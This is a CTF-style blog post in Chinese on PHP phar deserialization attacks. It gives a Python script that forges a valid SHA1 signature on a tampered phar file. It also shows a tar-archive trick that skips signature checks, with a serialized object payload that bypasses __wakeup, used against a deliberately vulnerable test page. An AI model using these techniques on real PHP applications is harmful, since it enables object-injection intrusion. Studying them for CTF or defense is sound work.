---
title: "Phar 签名的修复与绕过"
date: 2022-08-20T20:31:36+08:00
lastmod: 2022-08-20T20:31:36+08:00
draft: false
author: "X1r0z"

tags: ['php', 'ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

phar 反序列化有时候会和 `__wakeup` 的绕过 (CVE-2016-7124) 结合在一起, 直接修改 phar 原始文件的话会报错

原因是 phar 文件包含签名, 解析时会检测文件是否被篡改

做题碰到很多次了, 在这里记录一下

<!--more-->

## 修复签名

phar 签名的相关信息

[https://www.php.net/manual/zh/phar.fileformat.signature.php](https://www.php.net/manual/zh/phar.fileformat.signature.php)

![20220820200827](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220820200827.png)

签名支持 MD5, SHA1, SHA256, SHA512, OpenSSL 算法, 默认是 SHA1

其中末尾的4个字节是固定的, 表示该文件存在签名

倒数第8~4个字节表示文件使用的签名算法

倒数8个字节往前就是签名的二进制值, 对文件开头到声明签名部分以前的内容进行计算, 长度视算法类型而定

以 SHA1 为例

在修改了 phar 数据后, 我们需要更改的就是这部分 (20字节长度) 的内容

![20220820201619](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220820201619.png)

Python 脚本

```python
import hashlib

with open('phar.phar', 'rb') as f:
    content = f.read()

text = content[:-28]
end = content[-8:]
sig = hashlib.sha1(text).digest()

with open('phar_new.phar', 'wb+') as f:
    f.write(text + sig + end)

```

注意计算 SHA1 的时候要使用 `.digest()` 而不是 `.hexdigest()`, 因为文件本身保存的签名是二进制格式的

其它签名算法同理, 就是切片的长度不一样 (不过一般也不怎么用到)

## 使用 tar 绕过签名

[https://www.anquanke.com/post/id/240007](https://www.anquanke.com/post/id/240007)

在看这篇文章的时候发现 phar 协议对 tar 的处理跟 gzip bzip2 这些不太一样

对 gzip bzip2 处理时, PHP 会将其解压缩, 然后解析里面的 phar 文件

而对 tar 处理时, PHP 会检测压缩包中是否存在 `.phar/.metadata`, 存在的话就会将 .metadata 里的内容**直接进行反序列化**

测试代码

```php
<?php

class A{
    public $text = 'test';
    function __destruct(){
        echo $this->text;
    }

    function __wakeup(){
        $this->text = 'fail';
    }
}

file_get_contents($_GET['a']);

?>
```

本地创建 .phar 文件夹和 .metadata 文件

```bash
exp10it@LAPTOP-TBAF1QQG:~/WWW/.phar$ ls -a
.metadata
exp10it@LAPTOP-TBAF1QQG:~/WWW/.phar$ cat .metadata
O:1:"A":2:{s:4:"text";s:7:"success";}
```

tar 压缩, **必须是 Linux 环境**

```bash
tar -cf phar.tar .phar/
```

访问 `index.php?a=phar://phar.tar`

![20220820204322](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220820204322.png)

这种方法直接扔掉了 phar 的签名, 修改数据时根本不用担心签名的问题, 也就不存在 "修复签名" 的说法